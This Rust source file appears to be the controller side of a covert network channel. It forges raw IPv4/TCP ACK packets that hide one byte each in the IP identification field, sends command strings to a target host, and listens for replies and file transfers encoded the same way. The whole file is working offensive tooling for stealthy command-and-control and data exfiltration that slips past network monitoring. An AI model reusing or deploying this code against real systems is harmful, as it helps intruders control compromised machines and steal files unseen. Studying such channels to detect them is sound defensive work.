use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4::{MutableIpv4Packet, Ipv4Packet, checksum};
use pnet::packet::tcp::{MutableTcpPacket, TcpFlags, TcpPacket, ipv4_checksum};
use pnet::packet::Packet;
use std::net::Ipv4Addr;
// CHANGED: Use transport instead of datalink
use pnet::transport::{transport_channel, TransportChannelType::Layer3, TransportSender, TransportReceiver};
use std::sync::atomic::{AtomicU16, AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::Duration;
use std::io::{self, Write};

pub const CMD_EOF: u8 = 0x41;
pub const CMD_START_TRANSFER: u8 = 0x40;

static IPID_COUNTER: AtomicU16 = AtomicU16::new(0);

pub struct ChannelConfig {
    pub target_ip: Ipv4Addr,
    pub local_ip: Ipv4Addr,
    pub send_port: u16,    
    pub listen_port: u16,  
}

pub struct CovertChannel {
    pub config: Arc<ChannelConfig>,
    pub tx: TransportSender, // FIXED: Removed Box<dyn ...>
    pub running: Arc<AtomicBool>, 
}

impl CovertChannel {
    pub fn new(
        _interface: &pnet::datalink::NetworkInterface,
        target_ip: Ipv4Addr,
        local_ip: Ipv4Addr,
        send_port: u16,
        listen_port: u16,
    ) -> (Self, TransportReceiver) {
        let protocol = Layer3(IpNextHeaderProtocols::Tcp);
        
        // Match on the result directly
        let (tx, rx) = match transport_channel(4096, protocol) {
            Ok((tx, rx)) => (tx, rx),
            Err(e) => panic!("[!] Failed to open L3 channel: {}. Run with sudo.", e),
        };

        let config = Arc::new(ChannelConfig {
            target_ip,
            local_ip,
            send_port,
            listen_port,
        });

        (Self { 
            config, 
            tx, // No Box::new needed anymore
            running: Arc::new(AtomicBool::new(true)) 
        }, rx)
    }

    pub fn stop(&self) {
        self.running.store(false, Ordering::Relaxed);
    }

    pub fn send_byte(&mut self, byte: u8) {
        // At Layer 3, we build the IP header and TCP header together
        let mut buffer = [0u8; 40];
        let (ip_slice, tcp_slice) = buffer.split_at_mut(20);

        let mut ip_packet = MutableIpv4Packet::new(ip_slice).unwrap();
        ip_packet.set_version(4);
        ip_packet.set_header_length(5);
        ip_packet.set_total_length(40);
        ip_packet.set_ttl(64);
        ip_packet.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
        ip_packet.set_source(self.config.local_ip);
        ip_packet.set_destination(self.config.target_ip);
        
        // Encode data in IPID lower bits
        let current_count = IPID_COUNTER.fetch_add(1, Ordering::Relaxed);
        let covert_id = ((current_count & 0xFF00)) | (byte as u16);
        ip_packet.set_identification(covert_id);

        let mut tcp_packet = MutableTcpPacket::new(tcp_slice).unwrap();
        tcp_packet.set_source(self.config.listen_port); 
        tcp_packet.set_destination(self.config.send_port);
        tcp_packet.set_flags(TcpFlags::ACK);
        tcp_packet.set_window(64240);
        tcp_packet.set_data_offset(5);

        let tcp_checksum = ipv4_checksum(&tcp_packet.to_immutable(), &self.config.local_ip, &self.config.target_ip);
        tcp_packet.set_checksum(tcp_checksum);
        
        let ip_checksum = checksum(&ip_packet.to_immutable());
        ip_packet.set_checksum(ip_checksum);

        // Send to target IP address
        let _ = self.tx.send_to(ip_packet, std::net::IpAddr::V4(self.config.target_ip));
    }

    pub fn send_command(&mut self, cmd: &str) {
        for b in cmd.as_bytes() {
            self.send_byte(*b);
            thread::sleep(Duration::from_millis(15));
        }
        self.send_byte(b'\n');
    }
}

pub fn start_listening(mut rx: TransportReceiver, config: Arc<ChannelConfig>, running: Arc<AtomicBool>) {
    thread::spawn(move || {
        let mut binary_mode = false;
        let mut file_data = Vec::new();
        
        // Create an iterator over IPv4 packets
        let mut iter = pnet::transport::ipv4_packet_iter(&mut rx);

        println!("[*] L3 Covert Listener Active.");

        while running.load(Ordering::Relaxed) {
            // CHANGED: Use the L3 iterator. No more manual Ethernet offset math.
            if let Ok((ip, _)) = iter.next() {
                if ip.get_source() == config.target_ip && ip.get_next_level_protocol() == IpNextHeaderProtocols::Tcp {
                    if let Some(tcp) = TcpPacket::new(ip.payload()) {
                        if tcp.get_destination() == config.listen_port {
                            let byte = (ip.get_identification() & 0x00FF) as u8;
                            
                            match byte {
                                CMD_START_TRANSFER => {
                                    binary_mode = true;
                                    file_data.clear();
                                    println!("\n[!] File transfer started...");
                                },
                                CMD_EOF => {
                                    if binary_mode {
                                        println!("\n[+] Received {} bytes.", file_data.len());
                                        binary_mode = false;
                                    }
                                },
                                _ => {
                                    if binary_mode {
                                        file_data.push(byte);
                                    } else {
                                        print!("{}", byte as char);
                                        let _ = io::stdout().flush();
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    });
}
